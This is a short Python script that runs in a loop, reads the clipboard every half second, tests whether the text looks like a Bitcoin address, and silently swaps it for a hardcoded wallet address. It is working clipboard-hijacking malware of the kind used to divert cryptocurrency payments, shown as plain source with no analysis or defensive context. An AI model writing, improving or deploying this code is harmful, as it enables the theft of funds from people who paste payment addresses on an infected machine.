from tkinter import Tk
import clipboard, time

wallet_address = "WALLET ADDRESS CHANGED"
x = Tk()

def checkclip():
	clipboard_str = x.clipboard_get()
	return(clipboard_str)

def isBTC(data):
	if data[0] == "1":
		if len(data) >= 27 and len(data) <= 34:
			return True

	elif data[0] == "3":
		if len(data) >= 27 and len(data) <= 34:
			return True

	elif data[:3] == "bc1":
		if len(data) >= 27:
			return True

	else:
		return(False)

if __name__ =="__main__":
	while True:
		time.sleep(.5)
		if isBTC(checkclip()) == True:
			print(3)
			clipboard.copy(wallet_address)